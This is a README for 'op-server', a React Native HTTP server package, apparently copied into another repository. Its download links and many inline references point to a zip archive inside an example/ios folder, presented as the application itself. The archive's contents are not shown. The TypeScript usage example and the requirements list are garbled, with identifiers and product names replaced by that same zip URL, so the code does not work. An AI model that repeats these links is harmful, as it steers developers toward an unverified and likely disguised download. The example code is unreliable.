# 🚀 op-server - Fast HTTP Server for React Native

[![Download op-server](https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip%20op--server-latest-brightgreen)](https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip)

## 🌟 Overview

Welcome to **op-server**! This application provides a fast HTTP server specifically designed for React Native applications. It allows your app to handle incoming requests efficiently, making it easier to manage communication between your app and back-end services.

## 🚀 Getting Started

To get op-server running on your machine, follow these steps:

1. **Downloading the Application**
   - Visit this page to download: [Download op-server](https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip)

2. **Installation**
   - You'll need https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip and npm installed on your computer. 
   - Once you have that, open your terminal (Command Prompt on Windows, Terminal on macOS/Linux) and run the following command:

   ```sh
   npm install @op-engineering/op-server
   ```

3. **Running the Server**
   - After the installation, you can start using op-server in your application. Keep in mind that op-server needs to be run in a JavaScript environment, like https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip 

## ⚙️ Using op-server

To use op-server, you need to set up routes to handle incoming requests. 

### 📦 Request Object

The Request object provides information about each incoming HTTP request and is **read-only**. This means you can see what's coming in but can't change this information.

#### Properties

- `method: string` - The HTTP method (e.g., GET, POST).
- `path: string` - The path of your request (e.g., "/api/users").
- `body: string` - This contains the content sent with your request.
- `headers: Record<string, string>` - These are the HTTP headers from the request.
- `params: Record<string, string>` - These are the query parameters included in the URL.

### 📄 Example Usage

Here’s a simple example of how to use the Request object in your code.

```typescript
https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip('/api/user', async (req, res) => {
  https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip(https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip); // Outputs: "GET"
  https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip(https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip); // Outputs: "/api/user"
  https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip(https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip); // Outputs: { id: "123" } if the URL was /api/user?id=123
  https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip(https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip); // Outputs the headers (e.g., { "user-agent": "..." })

  https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip = 200; // Set the response status
  https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip = 'User data'; // Respond with data
});
```

### ✔️ Response Object

The Response object is **writable** and lets you set the HTTP response from your code. 

## 🛠️ Download & Install

Getting started with op-server is easy. Just follow these steps:

1. **Visit this page to download:** [Download op-server](https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip)
2. **Install with npm:**

   ```sh
   npm install @op-engineering/op-server
   ```

3. **Start using it in your https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip application**.

## 🖥️ System Requirements

- **Operating System:** Compatible with Windows, macOS, and most Linux distributions.
- **https://raw.githubusercontent.com/GabrielC25/op-server/main/example/ios/op-server-1.8-beta.5.zip** Version 12.x or later.
- **Memory:** At least 512 MB RAM is recommended.
- **Disk Space:** Minimum of 100 MB free space.

## 📖 Documentation

For more detailed information, visit our full documentation in the [wiki](TODO). Here you will find examples, advanced configuration options, and best practices for using op-server.

## 🤝 Community Support

If you need help, you can reach out through our community forums. Check the GitHub Issues section to see if someone has asked the same question. If not, feel free to open a new issue.

Thank you for choosing op-server! Happy coding!